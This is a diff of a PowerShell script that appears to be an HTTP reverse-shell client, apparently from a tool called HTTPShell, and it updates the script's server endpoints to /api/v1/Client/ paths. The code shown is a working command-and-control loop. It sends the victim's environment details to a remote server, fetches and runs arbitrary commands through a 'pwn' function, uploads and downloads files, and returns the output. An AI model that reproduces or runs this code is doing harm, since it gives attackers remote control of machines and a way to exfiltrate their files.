@@ -76,14 +76,14 @@ function Send-HttpRequest {
 while ($true) {
    $invoke64 = "Write-Output HTTPShellNull" ; if ($sleeps) { Start-Sleep $sleeps }
    $env = GetEnviron ; $commandx = $null ; $errorlog = $null ; $getenv64 = R64Encoder -t $env
-   $request1 = $(Send-HttpRequest "$server/api/info" "POST" "Info: $getenv64`n`n") 2>&1> $null
-   $response = $($token = Send-HttpRequest "$server/api/token" "GET") 2>&1> $null
+   $request1 = $(Send-HttpRequest "$server/api/v1/Client/Info" "POST" "Info: $getenv64") 2>&1> $null
+   $response = $($token = Send-HttpRequest "$server/api/v1/Client/Token" "GET") 2>&1> $null
    $response = $($invoke64 = R64Decoder -t ($token.Split(" ")[-1])) 2>&1> $null
 
    if ($invoke64 -like "upload*") {
       $file_path = $invoke64.toString().Split("!")[1] ; $invoke64 = $null
       if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
-      $download = $($file_content = Send-HttpRequest "$server/api/download" "GET") 2>&1> $null
+      $download = $($file_content = Send-HttpRequest "$server/api/v1/Client/Download" "GET") 2>&1> $null
       $file_content = R64Decoder -f $file_content.ToString().Split(" ")[-1]
       [IO.File]::WriteAllBytes("$file_path", $file_content)}
 
@@ -91,10 +91,10 @@ while ($true) {
       $file_path = $invoke64.toString().Split(" ",2)[1].Split("!")[0] ; $invoke64 = $null
       if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
       $file_content = R64Encoder -f "$file_path"
-      $upload = $(Send-HttpRequest "$server/api/upload" "POST" "File: $file_content`n`n") 2>&1> $null }
+      $upload = $(Send-HttpRequest "$server/api/v1/Client/Upload" "POST" "File: $file_content") 2>&1> $null }
 
    if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64") | Out-String) 2>&1 ; $param = "Debug"
    if ($errorlog -ne $null) { $commandx = Write-Output $error[0] | Out-String ; $param = "Error" }
    if (($invoke64 -like "cd*") -or ($invoke64 -like "Set-Location*")) { if (!$errorlog) { $commandx = "HTTPShellNull" }}
-   $output64 = R64Encoder -t $commandx ; [string]$path = $param.toLower()
-   $request2 = $(Send-HttpRequest "$server/api/$path" "POST" "$param`: $output64`n`n") 2>&1> $null }}
+   $output64 = R64Encoder -t $commandx ; [string]$path = $param
+   $request2 = $(Send-HttpRequest "$server/api/v1/Client/$path" "POST" "$param`: $output64") 2>&1> $null }}
